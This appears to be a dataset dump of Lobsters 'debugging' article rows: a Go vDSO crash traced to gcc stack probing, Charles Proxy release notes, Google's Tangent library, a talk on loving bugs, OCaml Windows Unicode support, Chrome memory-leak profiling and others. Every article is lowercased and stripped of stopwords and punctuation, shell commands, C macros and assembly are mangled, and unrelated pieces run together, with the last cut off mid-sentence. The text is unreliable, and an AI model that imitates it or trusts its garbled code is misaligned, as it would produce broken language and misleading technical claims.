linux shell utility including shell initramfs built like linux kernel source tree listtxt file list scriptsgeninitramfslistsh initramfsgz listtxt qemu boot kernel initramfs directly kernel initrd initramfsgz append smp nographic serial mon stdio cpu host enablekvm resulted output realized even compiled serial port support laptop kernel oh mean physical serial port right anyway quick detour rebuild kernel serial support crossing finger change anything important tried successfully booted ran reproducer crash yup good mean problem reproducible vm machine tried qemu command home server kernel nothing copied kernel laptop booted crashed kernel matter hardware issue juggling kernel point knew going compiling lot kernel try narrow decided move powerful machine lying around somewhat old xeon defunct sadly copied knownbad kernel source machine built tested crash headscratching later made sure original bad kernel binary crashed back hardware matter machine build kernel tried building kernel home server one promptly triggered crash building kernel two machine yield crash third machine difference well gentoo box gentoo hardened laptop home server unstable xeon server stable mean gcc different laptop home server gcc gentoo hardened xeon gcc gentoo hardened home server kernel nearly version laptop though exactly built gcc reproduce crash conclude compiler used build kernel kernel config matter narrow thing compiled exact kernel tree laptop home server confirmed indeed crashed copied config home server compiled found mean looking kernel config difference compiler difference gcc laptop config crash gcc laptop config crash gcc server config crash two configs one good one bad time diff course two configs vastly different since tend tailor kernel config include driver need particular machine repeatedly rebuild kernel narrowing difference decided start known bad config start removing thing since reproducer take variable amount time crash easier test still crash wait crash crash long wait convince course kernel build managed simplify config much kernel networking support filesystems block device core even support pci still work fine vm though kernel build took le second kernel size regular one moved known good config removed unnecessary junk making sure still crash reproducer trickier slower previous test false branch changed something made reproducer start crashing know yet misidentified crash got crash walk back previous kernel built make sure knew exactly crash introduced ended kernel build eventually narrowed small handful different config option stood particular configoptimizeinlining carefully testing concluded indeed option culprit turning produced kernel crash reproducer testcase turning produced kernel option turned allows gcc better determine inline function really must inlined instead forcing inline unconditionally also explains gcc connection inlining behavior likely change gcc version force alwaysinline user request via config gcc old gcc warn unused static inline function wunusedfunction turn avoid need complex ifdef directive suppress warning clang well using unused function attribute redundant harmful gcc defined configarchsupportsoptimizedinlining defined configoptimizeinlining gnuc define inline inline attribute alwaysinline unused notrace define inline inline attribute alwaysinline unused notrace define inline inline attribute alwaysinline unused notrace else lot inline function cause havoc function tracing define inline inline attribute unused notrace define inline inline attribute unused notrace define inline inline attribute unused notrace endif next know configoptimizeinlining make difference potentially change behavior every single inline function across whole kernel pinpoint problem idea hashbased differential compilation basic premise compile part kernel option turned part kernel option turned testing resulting kernel checking whether problem appears deduce subset kernel compilation unit contains problem code instead trying enumerate object file kind binary search decided go hashbased approach wrote wrapper script gcc binbash args doit gt case c shift objfile esac shift done extra z doit sha echo n objfile cut echo objfile objstxt bit echo n objfile else extradconfigoptimizeinlining echo objfile fi fi exec gcc extra args hash object file name check given bit hash first bit identified bit environment variable bit build without configoptimizeinlining build configoptimizeinlining found kernel around object file point minimization effort paid requires bit unique identification hashbased approach also one neat property choose worry crashing outcome bit since much harder prove given kernel build crash crash probabilistic take quite sometimes built kernel one bit prefix took minute started testing every time got crash narrowed regular expression possible hash zero bit specific position crash thus zero bit object file couple looking promising hit crash single match grep vdso code course vdso shenanigan kernel vdso actually kernel code vdso small shared library kernel place address space every process allows apps perform certain special system call without ever leaving user mode increase performance significantly still allowing kernel change implementation detail system call needed word vdso gcccompiled code built kernel end linked every userspace app userspace code explains kernel compiler mattered kernel shared library provided kernel go us vdso performance go also happens rather insane opinion policy reinventing standard library use standard linux glibc code call vdso rather roll call syscalls flipping configoptimizeinlining vdso let look assembly configoptimizeinliningn file format disassembly section text vreadtsc push rbp mov rsp rbp nop nop nop rdtsc shl rdx rdx rax mov rip rdx cmp rax rdx ja pop rbp retq mov rdx rax pop rbp retq nopl rax nopw rax vdsoclockgettime push rbp mov rsp rbp ec sub rsp orq rsp add rsp lea rip ff cmp edi je dc jle ff cmp edi je ff cmp edi jne configoptimizeinliningy file format disassembly section text vdsoclockgettime push rbp lea rip ff cmp edi b mov rsp rbp e je dc jle ff cmp edi je ff cmp edi jne interestingly configoptimizeinliningy supposed allow gcc inline le actually resulted inlining vreadtsc inlined version configoptimizeinliningn version vreadtsc marked inline gcc perfectly within right behave like counterintuitive may care function inlined actual problem well looking closer noninline push rbp mov rsp rbp ec sub rsp orq rsp add rsp gcc allocating stack stack allocation stack probe specifically result fstackcheck gcc feature gentoo linux enables fstackcheck default hardened profile mitigation stack clash vulnerability fstackcheck old gcc feature intended turn effectively mitigates issue told proper stack clash protection gcc sideeffect cause fairly silly behavior every nonleaf function function make function call end probing stack kib ahead stack pointer word code compiled fstackcheck potentially need least kib stack space unless leaf function function every call inlined go love small stack text sb nosplit careful calling function gcc calling convention guaranteed byte entry taken call us another leaf gettime code use hope enough turn byte enough everybody certainly kernel worth pointing vdso specification make mention maximum stack usage guarantee squarely go fault making invalid assumption conclusion perfectly explains symptom stack probe orq logical noop effectively probe target address unmapped segfault seeing segfaults vdso code breaking go well really noop since orq atomic instruction really happens cpu read memory address writes back creates race condition thread running parallel cpu orq might effectively wind undoing memory write occurs simultaneously since write stack bound likely intruding thread stack random data star line undoing memory write also work around issue since prevents two thread effectively running go code time fix left go devs solution ultimately pivot larger stack calling vdso function introduces small speed penalty nanosecond acceptable building nodeexporter fixed go toolchain crash went away
373,Lobsters,debugging,Debugging,Charles Web Debugging Proxy,https://www.charlesproxy.com/,charles web debugging proxy,read read read read read read read read read read read read read read read read read read read read read read read read read read read read read read read read read read read read read read read charlesproxy read,may charles security bulletin local privilege escalation charles earlier read apr charles released major bug fix minor improvement read mar charles io released read nov charles released important bug fix read sep charles released major new tl debugging capability minor improvement bug fix including macos high sierra support read jul charles released minor improvement bug fix read jun charles released including brotli compression support minor bug fix improvement read may charles released bug fix minor improvement read apr charles released bug fix read apr charles released including major new feature bug fix read nov charles released including bug fix minor improvement read sep charles released including bug fix read sep charles released support macos sierra minor bug fix read aug charles released featuring http improved look feel read may charles released including minor bug fix especially fix ssl certificate installation android read feb charles released support at io crash fix older version mac o x read feb charles released including bug fix minor improvement read nov charles released ssl websockets improvement read oct charles released including major new feature read jul charles released bug fix improvement read mar charles released minor bug fix read mar charles released improved ssl new ssl ca certificate install required major new feature improvement read oct charles released improvement ssl support mac o x yosemite support minor bug fix improvement read may charles released minor bug fix read may charles released minor bug fix improvement read apr charles released major new feature bug fix including ability focus host separated noise read oct charles released support mac o x maverick minor bug fix happy maverick day read oct charles released minor bug fix read sep charles released minor bug fix improvement read sep charles released new feature bug fix read feb charles released includes new feature bundled java runtime need install java anymore bug fix read jun charles beta released change ssl signing charles mac o x use apple new developer id codesigning read dec charles released including bug fix minor change read nov charles released including major bug fix enhancement read sep charles released including minor bug fix read aug charles released including minor enhancement bug fix read aug charles released including new feature enhancement bug fix new feature include har saz file import read aug charles released including bug fix minor new feature read jan charles released minor bug fix read dec charles released major new feature bug fix enhancement oct charles released minor feature bug fix sep charles released major change especially ssl may new website launched follow charlesproxy twitter say hi san francisco wwdc mar charles released minor new feature bug fix experimental bit window support read feb charles released major new feature download sep charles autoconfiguration addon mozilla firefox add support firefox sep charles released minor new feature bug fix sep charles released minor new feature bug fix apr charles released minor new feature bug fix mar charles released major new feature release note jan charles public beta released download information blog dec charles released bug fix minor new feature nov charles mozilla firefox addon updated compatibility firefox nov charles released minor bug fix minor new featureschart tab includes chart size duration typesrequest response displayed combined one splitpanelssl handshake certificate error displayed tree aug charles released minor bug fix aug charles released minor bug fix aug charles released may charles released fix ssl bug java may charles rereleased fix launch bug computer nt used charles may charles released various improvement minor bug fix apr charles released minor bug fix improvement mar charles released minor bug fix mar charles released major new feature improvement mar charles public beta released feb charles release minor bug fix ibm jdk compatibilityimproved malformed referer header support feb charles release minor bug fix fixed port forwarding fault introduced feb charles release major improvement bug fix including recording limit large response saved temporary file reducing memory usagemtu support throttle flex bug fix dec charles release minor bug fix improvement soap information visible response still externalizable object parsing regression fixedamf view message simplified hide flex implementation detail nov charles release major improvement bug fix including major ui overhauljson jsonrpc supportsoap support sep charles release major improvement bug fix including major ui improvementssupport new filetypes including flvmajor improvement amf flash remoting viewerthank everyone made suggestion participated long testing process jun charles release minor improvement bug fix including support request body compression used web service fix parsing amfphp responsesimprovements amf viewer may charles release minor improvement bug fix including firefox extension improvedamf amf parsing improvedlook feel change give greater consistent range font size charles look feelssl error reporting improved connection made remote hostport forwarding tool reverse proxy tool rebind exception fixed apr charles release major new feature improvement bug fix including amf supportssl support ibm jdk thanks lance bader helping solve automatic update checkingdocumentation wiki open public mar charles release major improvement bug fix including proxy implementation improvement including better handling keepalive connectionssocks proxy added socksified application run charlesexternal proxy configuration improvement including authenticationflash remoting amf viewer improvementsdynamic proxy port support multiuser system nov charles release minor improvement bug fix including improved firefox proxy configurationport forwarding enhancement including port range udp forwardingbug fix reverse proxy amf viewer oct charles released major enhancement bug fix including improved firefox proxy configurationxml viewer improvementsline number displayed ascii viewer sep charles released major new feature enhancement including automatic firefox proxy configurationformatted form post query string informationparsing swf amf flash remoting binary format jun charles released major enhancement improvement
374,Lobsters,debugging,Debugging,Tangent: Source-to-Source Debuggable Derivatives,https://opensource.googleblog.com/2017/11/tangent-source-to-source-debuggable.html,tangent sourcetosource debuggable derivative,google research blog neural network nns reversemode automatic differentiation tf eager pytorch autograd tensorflow automatic differentiation python code well tensorflow eager function reversemode automatic differentiation next step tangent open source githubcomgoogletangent report u github griewank walther gruslys et al acknowledgment,crossposted google research blog tangent new free open source python library automatic differentiation contrast existing machine learning library tangent sourcetosource system consuming python function f emitting new python function computes gradient f allows much better user visibility gradient computation well easy userlevel editing debugging gradient tangent come many feature debugging designing machine learning model post give overview tangent api cover use tangent generate gradient code python easy interpret debug modify neural network nns led great advance machine learning model image video audio text fundamental abstraction let u train nns perform well task idea called reversemode automatic differentiation also known backpropagation comprises two pass nn first run forward pas calculate output value node run backward pas calculate series derivative determine update weight increase model accuracy training nns research novel architecture requires u compute derivative correctly efficiently easily also need able debug derivative model training well trying build something new yet understand automatic differentiation autodiff technique calculate derivative computer program denote mathematical function nearly every machine learning library implement existing library implement automatic differentiation tracing program execution runtime like tf eager pytorch autograd building dynamic dataflow graph differentiating graph aheadoftime like tensorflow contrast tangent performs aheadoftime autodiff python source code produce python source code output result finally read automatic derivative code like rest program tangent useful researcher student want write model python also read debug automaticallygenerated derivative code without sacrificing speed flexibility easily inspect debug model written tangent without special tool indirection tangent work large growing subset python provides extra autodiff feature python ml library highperformance compatible tensorflow numpy automatic differentiation python code automatically generate derivative plain python code math function like tfexp tflog derivative compose build backward pas similarly piece syntax subroutine conditionals loop also backwardpass version tangent contains recipe generating derivative code piece python syntax along many numpy tensorflow function call tangent onefunction api import tangent df tangentgrad f animated graphic happens call tangentgrad python function want print derivative run import tangent df tangentgrad f hood tangentgrad first grab source code python function pas tangent large library recipe derivative python syntax well tensorflow eager function function tangentgrad walk code reverse order look matching backwardpass recipe add end derivative function reverseorder processing give technique name reversemode automatic differentiation function df work scalar nonarray input tangent also support although started tensorflow eager support tangent tied one numeric library would gladly welcome pull request adding pytorch mxnet derivative recipe next step tangent open source githubcomgoogletangent go check download installation instruction tangent still experiment expect bug report u github best fix quickly working add support tangent aspect python language eg closure inline function definition class numpy tensorflow function also hope add advanced automatic differentiation compiler functionality future automatic tradeoff memory compute griewank walther gruslys et al aggressive optimization lambda lifting intend develop tangent together community welcome pull request fix feature happy deriving alex wiltschko research scientist google brain team acknowledgment bart van merriënboer contributed immensely aspect tangent internship dan moldovan led tf eager integration infrastructure benchmarking also thanks google brain team support post special thanks sander kleinfeld aleks haecky valuable contribution technical aspect post
375,Lobsters,debugging,Debugging,Love your bugs,http://akaptur.github.com/blog/2017/11/12/love-your-bugs/,love bug,python brasil love bug pilotcom dropbox recurse center bug bitflips real interesting talk unlikely bug impossible social bug cultural difference share bug bug help learn recurse center deliberate practice bug option know system know tool feature flag serverside gating love bug love bug obrigada,early october gave keynote python brasil belo horizonte aspirational lightly edited transcript talk also video available love bug currently senior engineer pilotcom working automating bookkeeping startup worked dropbox desktop client team story work earlier facilitator recurse center writer retreat programmer nyc studied astrophysics college worked finance year becoming engineer none really important remember thing need know love bug love bug entertaining dramatic investigation great bug full twist turn great bug like good joke riddle expecting one outcome result veers another direction course talk going tell bug loved explain love bug much convince love bug bug ok straight bug bug encountered working dropbox may know dropbox utility syncs file one computer cloud computer metaserver blockserver client vastly simplified diagram dropbox architecture desktop client run local computer listening change file system notice changed file read file hash content block block stored backend giant keyvalue store call blockserver key digest hashed content value content course want avoid uploading block multiple time imagine writing document probably mostly changing end want upload beginning uploading block blockserver client talk different server responsible managing metadata permission among thing client asks metaserver whether need block seen metaserver responds whether block need uploaded request response look roughly like client say changed file made block hash abcd deef efgh server responds first two upload third client sends block blockserver metaserver blockserver ok ok need abcd deef efgh efgh content client setup bug metaserver abcdldeef efgh client sometimes client would make weird request hash value sixteen character long instead thirtythree character long twice many plus one server know would throw exception see exception get reported go look log file desktop client really weird stuff would going client local database gotten corrupted python would throwing memoryerrors none would make sense never seen problem totally mystifying seen recognize every time thereafter hint middle character string often see instead comma l character see middle position ordinal value ascii comma ordinal value l binary two represented bin ord bin ord l notice l exactly one bit away comma herein lie problem bitflip one bit memory desktop client using gotten corrupted desktop client sending request server garbage character frequently see instead comma different bit flipped l bitflips real love bug show bitflips real thing happen theoretical concern fact domain common others one domain getting request user lowend old hardware true lot laptop running dropbox another domain lot bitflips outer space atmosphere space protect memory energetic particle radiation bitflips pretty common probably really care correctness space code might keeping astronaut alive i example even missioncritical hard software update space really need application defend bitflips variety hardware software approach take interesting talk katie betchold dropbox context really need protect bitflips machine corrupting memory user machine detect bitflip happens fall comma different character necessarily know bitflip actual file data read disk idea pretty limited set place could address instead decide basically silence exception move often kind bug resolve client restarts unlikely bug impossible one favorite bug couple reason first reminder difference unlikely impossible sufficient scale unlikely event start happen noticable rate social bug second favorite thing bug tremendously social one bug crop anywhere desktop client talk server lot different endpoint component system meant lot different engineer dropbox would see version bug first time see really scratch head easy diagnose investigation really quick look middle character see l cultural difference one interesting sideeffect bug exposed cultural difference server client team occasionally bug would spotted member server team investigated one server flipping bit probably random chance probably memory corruption need find affected machine get pool fast possible risk corrupting lot user data incident need respond quickly user machine corrupting data lot share bug investigating confusing bug especially one big system forget talk people maybe colleague seen bug shaped like one might save lot time forget tell people solution figured write tell story team meeting next time team hit something similar prepared bug help learn recurse center joined dropbox worked recurse center idea behind rc community selfdirected learner spending time together getting better programmer full extent structure rc curriculum assignment deadline scoping shared goal getting better programmer see people come participate program gotten c degree feel like solid handle practical programming people writing java ten year wanted learn clojure haskell many profile well job facilitator helping people make lack structure providing guidance based learned earlier participant colleague interested best technique learning selfmotivated adult deliberate practice lot different research space one one think interesting idea deliberate practice deliberate practice attempt explain difference performance expert amateur guiding principle look innate characteristic genetic otherwise go far towards explaining difference performance researcher originally ericsson krampe teschromer set discover explain difference settled time spent deliberate practice deliberate practice pretty narrow definition work pay playing fun operating edge ability project appropriate skill level easy learn anything hard make progress also get immediate feedback whether done thing correctly really exciting framework build expertise challenge programmer really hard advice apply hard know whether operating edge ability immediate corrective feedback rare case lucky get feedback ever case maybe take month get quick feedback small thing repl making design decision picking technology going get feedback thing quite long time one category programming deliberate practice useful model debugging wrote code mental model worked wrote code bug mental model quite right definition boundary understanding great learn something new reproduce bug rare case get immediate feedback whether fix correct bug like might teach something small program might learn something larger system code running got story bug like bug bug also one encountered dropbox time investigating desktop client sending log consistently expected started digging client logging system discovered bunch interesting bug tell subset bug relevant story simplified architecture system log server log ok client log log log log desktop client would generate log log compress encrypted written disk every often client would send server client would read log disk send log server server would decrypt store respond client reach log server let log directory grow unbounded certain point would start deleting log keep directory maximum size first two bug big deal first one desktop client sent log server starting oldest one instead starting newest really want example server would tell client send log client reported exception probably care log happened oldest log happen disk second bug similar first log directory hit maximum size client would delete log starting newest instead starting oldest lose log file either way probably care le older one third bug encryption sometimes server would unable decrypt log file generally figure maybe bitflip handling error correctly backend server would reply client would behave reasonably face would assume server would stop sending log file try send others returning corrupted log file clearly right behavior could consider returning since problem client request client also fix problem log file decrypted never able decrypt future really want client delete log move fact default behavior client get back server log file successfully stored said ok log file decrypted return bug straightforward fix first two bug client fixed alpha build gone majority client third bug fixed server deployed suddenly traffic log cluster spike serving team reach u ask know going take minute put piece together fix four thing going log file sent starting oldest log file deleted starting newest server decrypt log file would client got would stop sending log client corrupted log file would try send server would client would give sending log next run would try send file fail give eventually log directory would get full point client would start deleting newest file leaving corrupted one disk upshot three bug client ever corrupted log file would never see log client problem lot client state thought client single corrupted file dammed sending log server dam cleared sending rest content log directory option ok huge flood traffic coming machine around world fun thing working company dropbox scale particularly dropbox scale desktop client trigger selfddos easily first option deploy thing start going sideways rollback totally reasonable choice case helped u state transformed state server state client deleted file rolling back server would prevent additional client entering state solve problem increasing size logging cluster started getting even request increased capacity increased forever cluster isolated making request another cluster case handle exception ddos pointed one cluster keep scaling cluster going knock depedencies two problem another option considered shedding load need every single log file drop request one challenge easy way tell good traffic bad quickly differentiate log file old new solution hit one used dropbox number different occassions custom header chillout every client world respect client get response header make request provided number second someone wise added dropbox client early come handy year logging server ability set header easy problem solve two colleague isaac goldberg john lai implemented support set logging cluster chillout two minute initially managed deluge subsided next couple day know system first lesson bug know system good mental model interaction client server thinking would happen server interacting client level complexity thought way know tool second lesson know tool thing go sideways option reverse migration know thing going sideways discover thing great know crisis learn crisis never forget feature flag serverside gating third lesson writing mobile desktop application need serverside feature gating serverside flag discover problem serverside control resolution might take day week push new release submit new version app store bad situation dropbox desktop client going app store review process pushing build ten million client take time compare hitting problem feature flipping switch server ten minute later problem resolved strategy without cost bunch feature flag code add complexity dramatically get combinatoric problem testing feature enabled feature b one neither multiplied across n feature extremely difficult get engineer clean feature flag fact also guilty desktop client multiple version wild time get pretty hard reason benefit man need really need love bug talked bug love talked love bug want tell love bug love bug yet know exactly one way learn growth mindset sociologist carol dweck done ton interesting research people think intelligence found two different framework thinking intelligence first call fixed mindset hold intelligence fixed trait people change much mindset growth mindset growth mindset people believe intelligence malleable increase effort dweck found person theory intelligence whether hold fixed growth mindset significantly influence way select task work way respond challenge cognitive performance even honesty also talked growth mindset kiwi pycon keynote excerpt read full transcript finding honesty student write letter pen pal study saying study school score got found almost half student praised intelligence lied score almost one praised working hard dishonest effort several study found people fixed mindset reluctant really exert effort believe mean good thing working hard dweck note would hard maintain confidence ability every time task requires effort intelligence called question responding confusion found student growth mindset mastered material time regardless whether confusing passage among student fixed mindset read booklet without confusing passage mastered material fixedmindset student encountered confusing passage saw mastery drop student fixed mindset pretty bad recovering confused finding show growth mindset critical debugging recover confusion candid limitation understanding time really struggle way finding solution easier le painful growth mindset love bug learned love bug explicitly celebrating challenge working recurse center participant would sit next say sigh think got weird python bug say awesome love weird python bug first definitely true importantly emphasized participant finding something struggled accomplishment good thing done day mentioned recurse center deadline assignment attitude pretty much free say get spend day chasing weird bug flask exciting dropbox later pilot product ship deadline user always uniformly delighted spending day weird bug sympathetic reality world deadline however bug fix fix grumbly existence bug going help fix faster think even world deadline loom still apply attitude love bug fun working tough problem le worried focused end learning finally share bug friend colleague help teammate obrigada thanks folk gave feedback talk otherwise contributed sasha laundy amy hanlon julia evans julian cooper raphael passini diniz rest python brasil organizing team
377,Lobsters,debugging,Debugging,A bug-fix 12 years in the making,http://www.dra27.uk/blog/platform/2017/10/30/ocaml-unicode.html,bugfix year making,window unicode support ocaml mantis report github pull request altair lexifi github pull request building ocaml source ocaml jbuilder ocamllabs mantis report github pull request cygwincom version visual studio ocaml flexdll visual studio update build appveyor looking improvement technical detail manual,window unicode support ocaml august mantis report opened ocaml reporting window application could read filename containing unicode character various patch proposed last twelve year leading github pull request almost exactly year ago last spring clément franchini altair rebased patch added test finally nicolás ojeda bär lexifi took challenge completing patch minimising diff view merging ocaml resulting github pull request made time feature freeze last month followup pull request since polish thing luck testing good working story release candidate pushed yesterday building ocaml source hacking either ocaml jbuilder something else ocamllabsrelated keep working towards proper window implementation opam various solution opam already trying new native unicode may easier time directly window console everything except build building entirely source unicode change work supported version window see sequence correctly interpreted window earlier version run chcp enable interpreting sequence quickly hit bug window tracked mantis report mean prior window enable chcp command see nonascii character printing correctly following also see garbage character sequence patch github pull request hopefully due release next year fresh window machine need build environment still recommend cygwin download setup program cygwincom version insist nondefault package required make going build visual studio add andor package want build mingw port instead full command line installing quietmode noshortcuts nostartmenu nodesktop onlysite root c site http mirrorskernelorgsourcewarecygwin package make prefer type le want mingw qnndo r c http mirrorskernelorgsourcewarecygwin p make also want pick visual studio ocaml need vc toolset component give c compiler linker also window sdk desktop c component give u windowsh import library compulsory also select visual studio c core feature component shortcut starting developer command prompt buried alternatively install everything command line vccommunityexe passive add add add microsoftvisualstudiocomponentvccoreide finally let download ocaml tarball also flexdll flexdll also updated order support unicode filename version also includes fix visual studio update note flexdll fully backwards compatible build version ocaml prior ocaml need built using cygwin make microsoft c compiler available easiest way set start native tool command prompt run c note start login shell let leave command prompt bit use bash session opened run following command cd cygdrivecusersdradocuments tar xzf cd eval toolsmsvspromotepath configuration ocaml changed slightly sh mh must copied new location cp configmnth byteruncamlmh cp configsnth byteruncamlsh makefile still resides configmakefile cp configmakefile stage need edit configmakefile change prefix install location using c also configured build c see improvement sidebyside last release always prefer build flexlink part main compilation need drop source right place tar xzf mv flexdll finally run make flexdll worldopt install point take coffee break build finished installed exit bash shell done cygwin even build ocaml directory includes nonascii character started appveyor revealed bug see log appveyor looking improvement going back command prompt started update path include new compiler set path path c let see difference ocaml installed c ocaml installed c running ocamlc v c usersdradocumentsunicode ocamlc v ocaml compiler version standard library directory c c usersdradocumentsunicode ocamlc v ocaml compiler version standard library directory c already see benefit console support window however cosmetic problem real problem come try start ocaml toplevel c usersdradocumentsunicode ocaml c found bytecode executable file oops point going switch different ocaml compiler instead installed c also setup directory containing one directory called верблюд compare effect running ocaml entering sysreaddir even work environment c usersdradocumentsunicodeööç set fooверблюд c usersdradocumentsunicodeööç ocaml ocaml version syschdir sysgetenv foo unit sysgetcwd string c usersdradocumentsunicodeööçверблюд fall straight c usersdradocumentsunicodeööç set fooверблюд c usersdradocumentsunicodeööç ocaml ocaml version syschdir sysgetenv foo exception syserror invalid argument even command line run echo printstring sysargv fooml get fooml c usersdradocumentsunicodeööç ocaml fooml верблюд верблюд try get segfault technical detail actually happening hood switched window system call ancient window ansi call modern window nt wide unicode version say hello mean string communicated operating system represented sequence number instead number note section window used since window better consider encoding since console display window console capable displaying unicode code point would encoded surrogate pair code point however compatible ocaml string type indeed also compatible unixbased ocaml although internally using expose ocaml mean anything filenamerelated expects receive return application previously dealt ascii filename everything course work backwards compatible ascii however using nonascii character locale encoding problem go handling different filename provide runtime extremely unusual filename therefore filename received runtime function valid runtime interprets string encoded current locale effectively runtime note runtime function still always return application must behave old way example concerned may filename look like valid interpreted example stored database data file receiving encoded filename back runtime problem possible force runtime disable handling setting configmakefile ie need build entirely separately ocaml mode internally runtime continues use wide version window system call instead translating string runtime us current locale previous behaviour c binding window handle filename break per se may end passing encoded string window ansi function recognise however possible access function runtime using convert string c defined new type charos normal char unix wchart window function provided converting string charos string camlstatstrduptoos camlstatstrdupofos also optimised function converting charos string ocaml encoded string camlcopystringofos detail experimental api available manual
378,Lobsters,debugging,Debugging,Isolating memory leaks with Chrome’s Allocation Timeline,https://blog.logrocket.com/isolating-memory-leaks-with-chromes-allocation-timeline-244fa9c48e8e,isolating memory leak chrome allocation timeline,logrocket version memory terminology logrocket full visibility web apps logrocket try free,memory used program needed anymore supposed returned pool free memory available operating system reused program release unused memory called memory leak hand memory leak slow app may eventually cause crash common cause performance issue complex javascript apps tracking root cause memory leak difficult learned hard way logrocket working improve performance memory usage javascript sdk javascript garbage collected language automatically attempt free memory referred program anymore memory freed mean kept reference somewhere code unwanted reference often subtle finding reading code take hour fortunately better way approaching problem particular chrome allocation timeline great tool isolating investigating memory leak app allocation timeline show stack trace help identify part code responsible allocating particular object use feature need enable devtools setting disabled default open devtools setting find performance section check record heap allocation stack trace way let run example work following page doctype html html lang en head meta charset title leak title head body button id allocate allocate button button id release release button const allocate documentgetelementbyid allocate const release documentgetelementbyid release let string let interval randominteger min max min inclusive max exclusive min mathceil min max mathfloor max return mathfloor mathrandom max min min storestring size const new array size join stringspush leak allocate mb const size randominteger storestring size allocateonclick interval setinterval leak releaseonclick clearinterval interval string body html version play browser allocate button clicked script page repeatedly allocates mb memory store string reference string accumulate string array release button clicked open chrome task manager let script run several second see page consume increasing amount memory keeping reference string creating array simulates happens memory leak preventing javascript garbage collector cleaning memory used store string never released causing script memory usage climb pretend already know cause elevated memory usage allocation timeline help u find source leak ie using memory freed use select record allocation timeline located devtools memory tab click start button run profiler click allocate button example page see blue bar appear timeline blue bar represent allocated memory freed click release button blue bar become gray bar gray bar represent previously allocated memory freed stop profiler using circle upper left blue bar remain allocation timeline stop recording indicate potential memory leak explore case rerun profiler click allocate button stop profiler clicking release button left timeline full blue bar narrow focus single blue bar zooming limit constructor list object allocated highlighted span case see mb worth string allocated time span learn difference shallow size retained size see memory terminology section devtools doc expanding entry string constructor reveals single mb string allocated see string opening allocation stack tab see stack trace telling u exactly string created many case stack trace point place code need fixing quickly attempt finding spot without keep mind export allocation timeline snapshot clicking save link sidebar helpful find profiling especially busy leaky app particular one prone crashing slow devtools point unusable case crash cause lose timeline altogether instead letting app continue run frantically inspect timeline save snapshot close tab app running take deep breath open new tab open devtools load saved snapshot memory leak happen time time next time encounter one remember allocation timeline friend logrocket full visibility web apps logrocket frontend application monitoring solution let replay problem happened browser instead guessing error happen asking user screenshots log dump logrocket let replay session quickly understand went wrong work perfectly app regardless framework plugins log additional context redux vuex ngrxstore addition logging redux action state logrocket record console log javascript error stacktraces network requestsresponses header body browser metadata custom log also instrument dom record html cs page recreating pixelperfect video even complex singlepage apps try free
379,Lobsters,debugging,Debugging,gdbgui: browser-based frontend to GDB,https://github.com/cs01/gdbgui,gdbgui browserbased frontend gdb,join github today sign,dismiss join github today github home million developer working together host review code manage project build software together sign
380,Lobsters,debugging,Debugging,Something Rotten In The Core,http://www.codersnotes.com/notes/something-rotten-in-the-core/,something rotten core,jeff robert,key thought unix philosophy center around idea linking program together know piping output grep sed sort kind thing kinda work well guess text least one reason work ok enduser writing little script command full knowledge piece building understand grep understand sed piece suddenly stop working pick piped commandline apart see system made piece control importantly piece exposed idea spread throughout unix way never referring misfortune debugging see unix gdb debugger debugger old lot work put result usually work pretty well least term functionality every metric measure software kinda suck gdb intended user interface c arnold reinhold ccbysa despite every computer made past year graphical display gdb life parallel universe framebuffer never invented still use teletype printer teletypes work ok enough getting output interactive program fall apart people nt want deal pain gdb invented gdb wrapper separate piece software would show nice user interface internally would call gdb work talking calling library talking actually launching instance gdb passing command parsing result print get led dangerous path apis hard begin good api design much art take lot experience come good one reason many apis bad nt someone designed bad api nt even realize designing api begin much software world filled wrapper program nt actually thing outsource work program stack layer nice clean stack remember something jeff robert said layer grind feel one chipping bit away collide utter delight month back trying debug something using qt creator one day except could nt suddenly one morning refused start debugging program would nt say course would sit nothing nothing changed least thought failure turned experimentation microsoft symbol server right remote failure someone else part meant could nt debug locally course error happen life expected nt get error nt get warning nt get anything except unresponsive ui reason think precisely wrapper nt fully aware fact jeff goldblum said best famous scene jurassic park problem scientific power used nt require discipline attain read others done took next step nt earn knowledge nt take responsibility stood shoulder genius accomplish something fast could knew patented package slapped plastic lunch box want sell seen hundred time kind software function return bool instead error code precise error vanish poof gone used useful error message became false lucky get generic unexpected error appearing screen program using library calling commandline worker likely case wo nt get checked get printed log file never find never seen networking software sits spinning cursor something went wrong much userfacing network software built top program like ssh rsync thing fail nt know much problem precisely using library using commandline utility using thing illdefined interface begin based outputting text programmer think look example output figure api quote great douglas adam sure used many time incredibly apt today software major difference thing might go wrong thing possibly go wrong thing possibly go wrong go wrong usually turn impossible get repair seen cheap chinese toy look like playstation inside ne game fake illusion nice plastic finish outside open nothing rotten core wrapped layer opaque complexity making system fragile glued rather bolted together wrapping complex thing wrapper nt take responsibility thing rely like homer pecking bird simpson work fine everything expected slightest change situation happens everything break
381,Lobsters,debugging,Debugging,"Zebras All the Way Down - Bryan Cantrill, Uptime 2017",https://www.youtube.com/watch?v=fE2KDzZaxvE,zebra way bryan cantrill uptime,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature zebra way bryan cantrill uptime youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature zebra way bryan cantrill uptime youtube
383,Lobsters,debugging,Debugging,Kernel Recipes 2017 - Performance Analysis with BPF - Brendan Gregg,https://www.youtube.com/watch?v=nhxq6jLGc_w,kernel recipe performance analysis bpf brendan gregg,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature kernel recipe performance analysis bpf brendan gregg youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature kernel recipe performance analysis bpf brendan gregg youtube
386,Lobsters,debugging,Debugging,Diagnosing a Linux-only unit test failure,https://codeblog.jonskeet.uk/2017/10/08/diagnosing-a-linux-only-unit-test-failure/,diagnosing linuxonly unit test failure,cloud firestore step check really problem step reproduce locally step remove irrelevant test code step remove production code dependency deadend single double value back reproducing two double value step explore scope problem step look failed comparison step try fail simplify step try simplifying bit le step fix stroke luck next step point note filed issue like,odd one currently working cloud firestore support c introduced geopoint struct represent latitudelongitude pair represented double implement iequatable overload obvious way far good working test passed ci added type implement equality thought extract common code equalitytester class handle equal method operator latter via reflection went well local machine ci one environment failed use appveyor travis ci travis failing two failure one testing equality operator one part broader serializationdeserialization test odd time go normal diagnostic step check really problem nature failing test feel like intermittent problem always good get idea forced travis rebuild pull request travis couple time yes failed two test time step reproduce locally test fail ci really annoying couple time always taken hour sort try something get result think mean cycle slow fortunately linux box home fetched pull request ran test failed hooray quite nice able reproduce window laptop much better isolated ci step remove irrelevant test code two part code failing unit test production code ideally like get rid create truly minimal 